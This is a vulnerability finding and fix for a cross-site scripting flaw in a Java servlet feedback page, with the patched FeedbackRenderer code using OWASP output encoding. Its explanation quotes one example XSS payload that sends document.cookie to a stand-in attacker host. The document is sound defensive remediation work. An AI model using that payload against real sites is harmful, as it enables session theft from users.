## Verdict

Confirmed. `FeedbackRenderer.renderConfirmation` builds an HTML response by directly
string-concatenating `submission.authorName` and `submission.comment` into the markup, then
writes it to the servlet response with no output encoding. Both fields originate as untrusted
request parameters.

## Source

`FeedbackController.handleSubmit` reads `request.getParameter("comment")` and
`request.getParameter("author")` from the incoming `HttpServletRequest`. Neither value is
validated or encoded; both are wrapped into a `FeedbackRenderer.FeedbackSubmission` and passed
straight to `renderer.renderConfirmation(submission, response)`, which is the sink at
`FeedbackRenderer.java:36` (`out.println(html)`), where the concatenated string is written to the
HTTP response body as `text/html`.

## Fix

### File: FeedbackRenderer.java

```java
package com.example.feedback;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.Instant;
import java.util.logging.Logger;

import org.owasp.encoder.Encode;

public class FeedbackRenderer {

    private static final Logger LOG = Logger.getLogger(FeedbackRenderer.class.getName());

    public static class FeedbackSubmission {
        final String authorName;
        final String comment;
        final Instant submittedAt;

        FeedbackSubmission(String authorName, String comment, Instant submittedAt) {
            this.authorName = authorName;
            this.comment = comment;
            this.submittedAt = submittedAt;
        }
    }

    public void renderConfirmation(FeedbackSubmission submission, HttpServletResponse response) throws IOException {
        LOG.info("Feedback received at " + submission.submittedAt);

        String html = "<html><body>"
                + "<h1>Thanks for your feedback, " + Encode.forHtml(submission.authorName) + "!</h1>"
                + "<p>You said: " + Encode.forHtml(submission.comment) + "</p>"
                + "</body></html>";

        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println(html);
    }
}
```

## Explanation

Both untrusted fields are rendered inside HTML element content (a heading and a paragraph), so
the correct defense is contextual output encoding at the point of insertion rather than at the
source: encoding at the controller would still leave the renderer trusting a plain `String` with
no guarantee callers keep encoding it, and any future caller of `renderConfirmation` would inherit
the same unescaped concatenation.

`org.owasp.encoder.Encode.forHtml(...)` (OWASP Java Encoder, `org.owasp.encoder:encoder`) is used
because it is a small, actively maintained, contextual-encoding library purpose-built for this
case: it escapes the characters that let attacker-controlled text break out of HTML element
content (`<`, `>`, `&`, quotes) into markup or script, turning a value like
`<script>document.location='//evil.example/?c='+document.cookie</script>` into inert text that
renders literally instead of executing. It is applied independently to `authorName` and
`comment` at the exact point each is concatenated into `html`, immediately before the sink at
`out.println(html)`, so the fix holds regardless of how the two fields are populated upstream.

No behavior for legitimate input changes: ordinary names and comments contain none of the
characters `Encode.forHtml` escapes, so the rendered page is unchanged for the common case, and
the fix requires no other change to `FeedbackController` or the data flow.
